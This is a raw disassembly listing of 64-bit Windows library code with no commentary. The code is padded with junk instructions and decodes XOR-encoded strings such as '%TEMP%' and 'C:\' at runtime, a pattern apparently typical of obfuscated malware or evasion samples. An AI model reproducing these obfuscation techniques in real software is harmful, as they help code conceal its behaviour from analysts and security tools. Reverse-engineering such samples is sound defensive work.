   18000484e:	48 87 ed             	xchg   %rbp,%rbp
   180004851:	31 c0                	xor    %eax,%eax
   180004853:	48 81 c4 70 02 00 00 	add    $0x270,%rsp
   18000485a:	5e                   	pop    %rsi
   18000485b:	c3                   	ret
   18000485c:	0f 1f 40 00          	nopl   0x0(%rax)
   180004860:	56                   	push   %rsi
   180004861:	48 81 ec 60 02 00 00 	sub    $0x260,%rsp
   180004868:	b9 f2 02 00 00       	mov    $0x2f2,%ecx
   18000486d:	e8 4e da ff ff       	call   0x1800022c0
   180004872:	48 87 d2             	xchg   %rdx,%rdx
   180004875:	4d 8d 12             	lea    (%r10),%r10
   180004878:	e8 43 d4 ff ff       	call   0x180001cc0
   18000487d:	ff 15 a5 f9 01 00    	call   *0x1f9a5(%rip)        # 0x180024228
   180004883:	89 c1                	mov    %eax,%ecx
   180004885:	ff 15 3d fb 01 00    	call   *0x1fb3d(%rip)        # 0x1800243c8
   18000488b:	90                   	nop
   18000488c:	4d 87 db             	xchg   %r11,%r11
   18000488f:	c7 44 24 3c 55 00 00 	movl   $0x55,0x3c(%rsp)
   180004896:	00 
   180004897:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   18000489b:	83 f0 70             	xor    $0x70,%eax
   18000489e:	66 89 44 24 42       	mov    %ax,0x42(%rsp)
   1800048a3:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   1800048a7:	83 f0 01             	xor    $0x1,%eax
   1800048aa:	66 89 44 24 44       	mov    %ax,0x44(%rsp)
   1800048af:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   1800048b3:	83 f0 10             	xor    $0x10,%eax
   1800048b6:	66 89 44 24 46       	mov    %ax,0x46(%rsp)
   1800048bb:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   1800048bf:	83 f0 18             	xor    $0x18,%eax
   1800048c2:	66 89 44 24 48       	mov    %ax,0x48(%rsp)
   1800048c7:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   1800048cb:	83 f0 05             	xor    $0x5,%eax
   1800048ce:	66 89 44 24 4a       	mov    %ax,0x4a(%rsp)
   1800048d3:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   1800048d7:	83 f0 70             	xor    $0x70,%eax
   1800048da:	66 89 44 24 4c       	mov    %ax,0x4c(%rsp)
   1800048df:	66 c7 44 24 4e 00 00 	movw   $0x0,0x4e(%rsp)
   1800048e6:	48 8d 4c 24 42       	lea    0x42(%rsp),%rcx
   1800048eb:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   1800048f0:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   1800048f6:	ff 15 4c f8 01 00    	call   *0x1f84c(%rip)        # 0x180024148
   1800048fc:	41 50                	push   %r8
   1800048fe:	57                   	push   %rdi
   1800048ff:	5f                   	pop    %rdi
   180004900:	41 58                	pop    %r8
   180004902:	48 8d 05 b1 c1 01 00 	lea    0x1c1b1(%rip),%rax        # 0x180020aba
   180004909:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000490e:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
   180004915:	00 
   180004916:	4c 8d 05 a1 c1 01 00 	lea    0x1c1a1(%rip),%r8        # 0x180020abe
   18000491d:	b9 7f 00 00 00       	mov    $0x7f,%ecx
   180004922:	31 d2                	xor    %edx,%edx
   180004924:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   18000492a:	ff 15 e0 f7 01 00    	call   *0x1f7e0(%rip)        # 0x180024110
   180004930:	57                   	push   %rdi
   180004931:	41 55                	push   %r13
   180004933:	41 5d                	pop    %r13
   180004935:	5f                   	pop    %rdi
   180004936:	41 51                	push   %r9
   180004938:	4d 87 f6             	xchg   %r14,%r14
   18000493b:	4d 87 c9             	xchg   %r9,%r9
   18000493e:	41 59                	pop    %r9
   180004940:	41 54                	push   %r12
   180004942:	4d 87 d2             	xchg   %r10,%r10
   180004945:	4d 87 ff             	xchg   %r15,%r15
   180004948:	41 5c                	pop    %r12
   18000494a:	c7 44 24 50 98 fd 7b 	movl   $0x7bfd98,0x50(%rsp)
   180004951:	00 
   180004952:	8b 44 24 50          	mov    0x50(%rsp),%eax
   180004956:	4d 87 d2             	xchg   %r10,%r10
   180004959:	e8 e2 cc ff ff       	call   0x180001640
   18000495e:	b9 90 02 00 00       	mov    $0x290,%ecx
   180004963:	e8 e8 d6 ff ff       	call   0x180002050
   180004968:	57                   	push   %rdi
   180004969:	41 57                	push   %r15
   18000496b:	41 5f                	pop    %r15
   18000496d:	5f                   	pop    %rdi
   18000496e:	e8 1d d5 ff ff       	call   0x180001e90
   180004973:	ff 15 67 f8 01 00    	call   *0x1f867(%rip)        # 0x1800241e0
   180004979:	56                   	push   %rsi
   18000497a:	48 87 d2             	xchg   %rdx,%rdx
   18000497d:	5e                   	pop    %rsi
   18000497e:	e8 4d d5 ff ff       	call   0x180001ed0
   180004983:	b9 f5 ff ff ff       	mov    $0xfffffff5,%ecx
   180004988:	ff 15 02 f9 01 00    	call   *0x1f902(%rip)        # 0x180024290
   18000498e:	b9 06 00 00 00       	mov    $0x6,%ecx
   180004993:	ff 15 9f f9 01 00    	call   *0x1f99f(%rip)        # 0x180024338
   180004999:	56                   	push   %rsi
   18000499a:	57                   	push   %rdi
   18000499b:	5f                   	pop    %rdi
   18000499c:	5e                   	pop    %rsi
   18000499d:	48 8d 09             	lea    (%rcx),%rcx
   1800049a0:	4d 87 ed             	xchg   %r13,%r13
   1800049a3:	e8 d8 c9 ff ff       	call   0x180001380
   1800049a8:	c7 44 24 3c 12 00 00 	movl   $0x12,0x3c(%rsp)
   1800049af:	00 
   1800049b0:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   1800049b4:	83 f0 46             	xor    $0x46,%eax
   1800049b7:	66 89 44 24 42       	mov    %ax,0x42(%rsp)
   1800049bc:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   1800049c0:	83 f0 57             	xor    $0x57,%eax
   1800049c3:	66 89 44 24 44       	mov    %ax,0x44(%rsp)
   1800049c8:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   1800049cc:	83 f0 5f             	xor    $0x5f,%eax
   1800049cf:	66 89 44 24 46       	mov    %ax,0x46(%rsp)
   1800049d4:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   1800049d8:	83 f0 42             	xor    $0x42,%eax
   1800049db:	66 89 44 24 48       	mov    %ax,0x48(%rsp)
   1800049e0:	66 c7 44 24 4a 00 00 	movw   $0x0,0x4a(%rsp)
   1800049e7:	48 8d 4c 24 42       	lea    0x42(%rsp),%rcx
   1800049ec:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   1800049f1:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   1800049f7:	ff 15 0b f8 01 00    	call   *0x1f80b(%rip)        # 0x180024208
   1800049fd:	48 8d 09             	lea    (%rcx),%rcx
   180004a00:	48 89 f6             	mov    %rsi,%rsi
   180004a03:	4d 8d 36             	lea    (%r14),%r14
   180004a06:	c7 44 24 50 c9 00 6d 	movl   $0x6d00c9,0x50(%rsp)
   180004a0d:	00 
   180004a0e:	8b 44 24 50          	mov    0x50(%rsp),%eax
   180004a12:	53                   	push   %rbx
   180004a13:	48 87 db             	xchg   %rbx,%rbx
   180004a16:	5b                   	pop    %rbx
   180004a17:	41 57                	push   %r15
   180004a19:	90                   	nop
   180004a1a:	41 5f                	pop    %r15
   180004a1c:	e8 1f cf ff ff       	call   0x180001940
   180004a21:	41 54                	push   %r12
   180004a23:	4d 87 f6             	xchg   %r14,%r14
   180004a26:	41 5c                	pop    %r12
   180004a28:	48 8d 74 24 50       	lea    0x50(%rsp),%rsi
   180004a2d:	48 89 f1             	mov    %rsi,%rcx
   180004a30:	ba 04 01 00 00       	mov    $0x104,%edx
   180004a35:	ff 15 65 f8 01 00    	call   *0x1f865(%rip)        # 0x1800242a0
   180004a3b:	48 89 f1             	mov    %rsi,%rcx
   180004a3e:	ff 15 cc f7 01 00    	call   *0x1f7cc(%rip)        # 0x180024210
   180004a44:	90                   	nop
   180004a45:	48 81 c4 60 02 00 00 	add    $0x260,%rsp
   180004a4c:	5e                   	pop    %rsi
   180004a4d:	c3                   	ret
   180004a4e:	66 90                	xchg   %ax,%ax
   180004a50:	48 81 ec 38 02 00 00 	sub    $0x238,%rsp
   180004a57:	c7 44 24 2c 08 00 00 	movl   $0x8,0x2c(%rsp)
   180004a5e:	00 
   180004a5f:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180004a63:	b9 26 03 00 00       	mov    $0x326,%ecx
   180004a68:	e8 a3 cb ff ff       	call   0x180001610
   180004a6d:	48 87 ff             	xchg   %rdi,%rdi
   180004a70:	4d 87 ed             	xchg   %r13,%r13
   180004a73:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   180004a77:	ff 15 5b f8 01 00    	call   *0x1f85b(%rip)        # 0x1800242d8
   180004a7d:	57                   	push   %rdi
   180004a7e:	5f                   	pop    %rdi
   180004a7f:	b9 f5 ff ff ff       	mov    $0xfffffff5,%ecx
   180004a84:	ff 15 06 f8 01 00    	call   *0x1f806(%rip)        # 0x180024290
   180004a8a:	48 89 c1             	mov    %rax,%rcx
   180004a8d:	ff 15 85 f7 01 00    	call   *0x1f785(%rip)        # 0x180024218
   180004a93:	4d 8d 00             	lea    (%r8),%r8
   180004a96:	48 89 ff             	mov    %rdi,%rdi
   180004a99:	48 87 f6             	xchg   %rsi,%rsi
   180004a9c:	48 8d 12             	lea    (%rdx),%rdx
   180004a9f:	90                   	nop
   180004aa0:	48 8d 00             	lea    (%rax),%rax
   180004aa3:	90                   	nop
   180004aa4:	48 8d 0d fd bf 01 00 	lea    0x1bffd(%rip),%rcx        # 0x180020aa8
   180004aab:	ff 15 9f f7 01 00    	call   *0x1f79f(%rip)        # 0x180024250
   180004ab1:	4d 8d 09             	lea    (%r9),%r9
   180004ab4:	4d 87 ed             	xchg   %r13,%r13
   180004ab7:	4d 87 c0             	xchg   %r8,%r8
   180004aba:	52                   	push   %rdx
   180004abb:	5a                   	pop    %rdx
   180004abc:	c7 44 24 30 ee 8e c1 	movl   $0xc18eee,0x30(%rsp)
   180004ac3:	00 
   180004ac4:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180004ac8:	48 89 d2             	mov    %rdx,%rdx
   180004acb:	4d 8d 12             	lea    (%r10),%r10
   180004ace:	48 87 c9             	xchg   %rcx,%rcx
   180004ad1:	57                   	push   %rdi
   180004ad2:	90                   	nop
   180004ad3:	5f                   	pop    %rdi
   180004ad4:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   180004ad8:	4d 89 ff             	mov    %r15,%r15
   180004adb:	b9 12 02 00 00       	mov    $0x212,%ecx
   180004ae0:	e8 4b c8 ff ff       	call   0x180001330
   180004ae5:	48 8d 0d da bf 01 00 	lea    0x1bfda(%rip),%rcx        # 0x180020ac6
   180004aec:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   180004af1:	ba 04 01 00 00       	mov    $0x104,%edx
   180004af6:	45 31 c9             	xor    %r9d,%r9d
   180004af9:	ff 15 21 f7 01 00    	call   *0x1f721(%rip)        # 0x180024220
   180004aff:	4d 89 e4             	mov    %r12,%r12
   180004b02:	48 87 e4             	xchg   %rsp,%rsp
   180004b05:	41 56                	push   %r14
   180004b07:	41 5e                	pop    %r14
   180004b09:	ff 15 71 f7 01 00    	call   *0x1f771(%rip)        # 0x180024280
   180004b0f:	4d 87 c0             	xchg   %r8,%r8
   180004b12:	48 8d 09             	lea    (%rcx),%rcx
   180004b15:	48 87 d2             	xchg   %rdx,%rdx
   180004b18:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   180004b1d:	ba 04 01 00 00       	mov    $0x104,%edx
   180004b22:	ff 15 78 f7 01 00    	call   *0x1f778(%rip)        # 0x1800242a0
   180004b28:	c7 44 24 30 7e 7e c1 	movl   $0xc17e7e,0x30(%rsp)
   180004b2f:	00 
   180004b30:	8b 44 24 30          	mov    0x30(%rsp),%eax
   180004b34:	90                   	nop
   180004b35:	48 8d 3f             	lea    (%rdi),%rdi
   180004b38:	53                   	push   %rbx
   180004b39:	41 57                	push   %r15
   180004b3b:	41 5f                	pop    %r15
   180004b3d:	5b                   	pop    %rbx
   180004b3e:	48 87 db             	xchg   %rbx,%rbx
   180004b41:	90                   	nop
   180004b42:	e8 f9 cd ff ff       	call   0x180001940
   180004b47:	4d 87 ed             	xchg   %r13,%r13
   180004b4a:	48 87 db             	xchg   %rbx,%rbx
   180004b4d:	31 c0                	xor    %eax,%eax
   180004b4f:	48 81 c4 38 02 00 00 	add    $0x238,%rsp
   180004b56:	c3                   	ret
   180004b57:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   180004b5e:	00 00 
   180004b60:	56                   	push   %rsi
   180004b61:	48 81 ec 50 02 00 00 	sub    $0x250,%rsp
   180004b68:	b9 be 02 00 00       	mov    $0x2be,%ecx
   180004b6d:	e8 be d8 ff ff       	call   0x180002430
   180004b72:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   180004b77:	ff 15 53 f7 01 00    	call   *0x1f753(%rip)        # 0x1800242d0
   180004b7d:	ff 15 45 f7 01 00    	call   *0x1f745(%rip)        # 0x1800242c8
   180004b83:	b9 0d 00 00 00       	mov    $0xd,%ecx
   180004b88:	ff 15 aa f7 01 00    	call   *0x1f7aa(%rip)        # 0x180024338
   180004b8e:	c7 44 24 40 bc dd 59 	movl   $0x59ddbc,0x40(%rsp)
   180004b95:	00 
   180004b96:	8b 44 24 40          	mov    0x40(%rsp),%eax
   180004b9a:	48 8d 09             	lea    (%rcx),%rcx
   180004b9d:	48 87 d2             	xchg   %rdx,%rdx
   180004ba0:	4d 87 f6             	xchg   %r14,%r14
   180004ba3:	48 87 ff             	xchg   %rdi,%rdi
   180004ba6:	48 8d 12             	lea    (%rdx),%rdx
   180004ba9:	4d 89 c0             	mov    %r8,%r8
   180004bac:	b9 fa 00 00 00       	mov    $0xfa,%ecx
   180004bb1:	e8 2a cd ff ff       	call   0x1800018e0
   180004bb6:	57                   	push   %rdi
   180004bb7:	41 52                	push   %r10
   180004bb9:	41 5a                	pop    %r10
   180004bbb:	5f                   	pop    %rdi
   180004bbc:	4d 89 db             	mov    %r11,%r11
   180004bbf:	48 89 e4             	mov    %rsp,%rsp
   180004bc2:	ff 15 38 f6 01 00    	call   *0x1f638(%rip)        # 0x180024200
   180004bc8:	48 85 c0             	test   %rax,%rax
   180004bcb:	74 09                	je     0x180004bd6
   180004bcd:	48 89 c1             	mov    %rax,%rcx
   180004bd0:	ff 15 ba f5 01 00    	call   *0x1f5ba(%rip)        # 0x180024190
   180004bd6:	41 53                	push   %r11
   180004bd8:	41 51                	push   %r9
   180004bda:	41 59                	pop    %r9
   180004bdc:	41 5b                	pop    %r11
   180004bde:	48 8d 74 24 40       	lea    0x40(%rsp),%rsi
   180004be3:	31 c9                	xor    %ecx,%ecx
   180004be5:	48 89 f2             	mov    %rsi,%rdx
   180004be8:	ff 15 ba f5 01 00    	call   *0x1f5ba(%rip)        # 0x1800241a8
   180004bee:	90                   	nop
   180004bef:	48 87 c9             	xchg   %rcx,%rcx
   180004bf2:	e8 09 cc ff ff       	call   0x180001800
   180004bf7:	48 8d 0d a0 be 01 00 	lea    0x1bea0(%rip),%rcx        # 0x180020a9e
   180004bfe:	ff 15 4c f6 01 00    	call   *0x1f64c(%rip)        # 0x180024250
   180004c04:	ff 15 ce f5 01 00    	call   *0x1f5ce(%rip)        # 0x1800241d8
   180004c0a:	c7 44 24 40 17 24 47 	movl   $0x472417,0x40(%rsp)
   180004c11:	00 
   180004c12:	8b 44 24 40          	mov    0x40(%rsp),%eax
   180004c16:	41 57                	push   %r15
   180004c18:	57                   	push   %rdi
   180004c19:	5f                   	pop    %rdi
   180004c1a:	41 5f                	pop    %r15
   180004c1c:	4d 8d 12             	lea    (%r10),%r10
   180004c1f:	48 87 f6             	xchg   %rsi,%rsi
   180004c22:	90                   	nop
   180004c23:	41 51                	push   %r9
   180004c25:	41 59                	pop    %r9
   180004c27:	41 51                	push   %r9
   180004c29:	41 59                	pop    %r9
   180004c2b:	b9 b9 01 00 00       	mov    $0x1b9,%ecx
   180004c30:	e8 8b d6 ff ff       	call   0x1800022c0
   180004c35:	48 89 c9             	mov    %rcx,%rcx
   180004c38:	48 87 ff             	xchg   %rdi,%rdi
   180004c3b:	48 8d 1b             	lea    (%rbx),%rbx
   180004c3e:	48 87 e4             	xchg   %rsp,%rsp
   180004c41:	41 51                	push   %r9
   180004c43:	41 59                	pop    %r9
   180004c45:	ff 15 25 f6 01 00    	call   *0x1f625(%rip)        # 0x180024270
   180004c4b:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   180004c50:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   180004c57:	00 
   180004c58:	4c 8d 05 63 be 01 00 	lea    0x1be63(%rip),%r8        # 0x180020ac2
   180004c5f:	b9 00 04 00 00       	mov    $0x400,%ecx
   180004c64:	ba 00 01 00 00       	mov    $0x100,%edx
   180004c69:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   180004c6f:	ff 15 db f6 01 00    	call   *0x1f6db(%rip)        # 0x180024350
   180004c75:	90                   	nop
   180004c76:	4d 89 e4             	mov    %r12,%r12
   180004c79:	48 87 f6             	xchg   %rsi,%rsi
   180004c7c:	48 89 e4             	mov    %rsp,%rsp
   180004c7f:	90                   	nop
   180004c80:	90                   	nop
   180004c81:	c7 44 24 3c af 00 00 	movl   $0xaf,0x3c(%rsp)
   180004c88:	00 
   180004c89:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   180004c8d:	35 ec 00 00 00       	xor    $0xec,%eax
   180004c92:	66 89 44 24 40       	mov    %ax,0x40(%rsp)
   180004c97:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   180004c9b:	35 95 00 00 00       	xor    $0x95,%eax
   180004ca0:	66 89 44 24 42       	mov    %ax,0x42(%rsp)
   180004ca5:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
   180004ca9:	35 f3 00 00 00       	xor    $0xf3,%eax
   180004cae:	66 89 44 24 44       	mov    %ax,0x44(%rsp)
   180004cb3:	66 c7 44 24 46 00 00 	movw   $0x0,0x46(%rsp)
   180004cba:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   180004cbf:	ff 15 33 f5 01 00    	call   *0x1f533(%rip)        # 0x1800241f8
   180004cc5:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   180004cca:	b9 04 01 00 00       	mov    $0x104,%ecx
   180004ccf:	ff 15 e3 f5 01 00    	call   *0x1f5e3(%rip)        # 0x1800242b8
   180004cd5:	4d 8d 3f             	lea    (%r15),%r15
   180004cd8:	4d 89 ed             	mov    %r13,%r13
   180004cdb:	4d 87 c9             	xchg   %r9,%r9
   180004cde:	4d 89 db             	mov    %r11,%r11
   180004ce1:	4d 89 e4             	mov    %r12,%r12
   180004ce4:	48 87 d2             	xchg   %rdx,%rdx
   180004ce7:	41 55                	push   %r13
   180004ce9:	90                   	nop
   180004cea:	41 5d                	pop    %r13
   180004cec:	c7 44 24 40 b9 ea d6 	movl   $0xd6eab9,0x40(%rsp)
   180004cf3:	00 
   180004cf4:	8b 44 24 40          	mov    0x40(%rsp),%eax
   180004cf8:	4d 89 ed             	mov    %r13,%r13
   180004cfb:	90                   	nop
   180004cfc:	4d 89 db             	mov    %r11,%r11
   180004cff:	e8 fc ca ff ff       	call   0x180001800
   180004d04:	48 89 db             	mov    %rbx,%rbx
   180004d07:	55                   	push   %rbp
   180004d08:	48 89 d2             	mov    %rdx,%rdx
   180004d0b:	5d                   	pop    %rbp
   180004d0c:	4d 8d 6d 00          	lea    0x0(%r13),%r13
   180004d10:	48 87 db             	xchg   %rbx,%rbx
   180004d13:	48 8d 09             	lea    (%rcx),%rcx
   180004d16:	52                   	push   %rdx
   180004d17:	41 51                	push   %r9
   180004d19:	41 59                	pop    %r9
   180004d1b:	5a                   	pop    %rdx
   180004d1c:	41 56                	push   %r14
   180004d1e:	48 8d 12             	lea    (%rdx),%rdx
   180004d21:	41 5e                	pop    %r14
   180004d23:	48 8d 74 24 40       	lea    0x40(%rsp),%rsi
   180004d28:	48 89 f1             	mov    %rsi,%rcx
   180004d2b:	ba 04 01 00 00       	mov    $0x104,%edx
   180004d30:	ff 15 6a f5 01 00    	call   *0x1f56a(%rip)        # 0x1800242a0
   180004d36:	48 89 f1             	mov    %rsi,%rcx
   180004d39:	ff 15 d1 f4 01 00    	call   *0x1f4d1(%rip)        # 0x180024210
   180004d3f:	90                   	nop
   180004d40:	48 81 c4 50 02 00 00 	add    $0x250,%rsp
   180004d47:	5e                   	pop    %rsi
   180004d48:	c3                   	ret
   180004d49:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   180004d50:	56                   	push   %rsi
   180004d51:	48 81 ec 60 02 00 00 	sub    $0x260,%rsp
   180004d58:	c7 44 24 4c 62 00 00 	movl   $0x62,0x4c(%rsp)
   180004d5f:	00 
   180004d60:	48 8d 1b             	lea    (%rbx),%rbx
   180004d63:	8b 44 24 4c          	mov    0x4c(%rsp),%eax
   180004d67:	52                   	push   %rdx
   180004d68:	4d 89 ed             	mov    %r13,%r13
   180004d6b:	48 89 c9             	mov    %rcx,%rcx
   180004d6e:	5a                   	pop    %rdx
   180004d6f:	b9 40 01 00 00       	mov    $0x140,%ecx
   180004d74:	e8 67 ca ff ff       	call   0x1800017e0
   180004d79:	c7 44 24 50 40 00 00 	movl   $0x40,0x50(%rsp)
   180004d80:	00 
   180004d81:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   180004d86:	ff 15 64 f5 01 00    	call   *0x1f564(%rip)        # 0x1800242f0
   180004d8c:	51                   	push   %rcx
   180004d8d:	41 50                	push   %r8
   180004d8f:	41 58                	pop    %r8
   180004d91:	59                   	pop    %rcx
   180004d92:	ff 15 30 f5 01 00    	call   *0x1f530(%rip)        # 0x1800242c8
   180004d98:	89 c6                	mov    %eax,%esi
   180004d9a:	ff 15 40 f4 01 00    	call   *0x1f440(%rip)        # 0x1800241e0
   180004da0:	0f af c6             	imul   %esi,%eax
   180004da3:	89 44 24 50          	mov    %eax,0x50(%rsp)
   180004da7:	8b 44 24 50          	mov    0x50(%rsp),%eax
   180004dab:	48 89 e4             	mov    %rsp,%rsp
   180004dae:	48 87 f6             	xchg   %rsi,%rsi
   180004db1:	31 c9                	xor    %ecx,%ecx
   180004db3:	ff 15 0f f6 01 00    	call   *0x1f60f(%rip)        # 0x1800243c8
   180004db9:	c7 44 24 50 39 19 af 	movl   $0xaf1939,0x50(%rsp)
   180004dc0:	00 
   180004dc1:	8b 44 24 50          	mov    0x50(%rsp),%eax
   180004dc5:	48 87 c9             	xchg   %rcx,%rcx
   180004dc8:	48 87 ed             	xchg   %rbp,%rbp
   180004dcb:	48 8d 3f             	lea    (%rdi),%rdi
   180004dce:	4d 89 f6             	mov    %r14,%r14
   180004dd1:	41 50                	push   %r8
   180004dd3:	48 87 f6             	xchg   %rsi,%rsi
   180004dd6:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   180004dda:	41 58                	pop    %r8
   180004ddc:	48 89 c9             	mov    %rcx,%rcx
   180004ddf:	4d 87 db             	xchg   %r11,%r11
   180004de2:	41 52                	push   %r10
   180004de4:	90                   	nop
   180004de5:	41 5a                	pop    %r10
   180004de7:	e8 14 ca ff ff       	call   0x180001800
   180004dec:	b9 c0 01 00 00       	mov    $0x1c0,%ecx
   180004df1:	e8 7a d2 ff ff       	call   0x180002070
   180004df6:	4d 89 c0             	mov    %r8,%r8
   180004df9:	48 8d 6d 00          	lea    0x0(%rbp),%rbp
   180004dfd:	4d 87 ff             	xchg   %r15,%r15
   180004e00:	c7 44 24 2c bb 00 00 	movl   $0xbb,0x2c(%rsp)
   180004e07:	00 
   180004e08:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180004e0c:	35 f8 00 00 00       	xor    $0xf8,%eax
   180004e11:	66 89 44 24 30       	mov    %ax,0x30(%rsp)
   180004e16:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180004e1a:	35 81 00 00 00       	xor    $0x81,%eax
   180004e1f:	66 89 44 24 32       	mov    %ax,0x32(%rsp)
   180004e24:	8b 44 24 2c          	mov    0x2c(%rsp),%eax
   180004e28:	35 e7 00 00 00       	xor    $0xe7,%eax
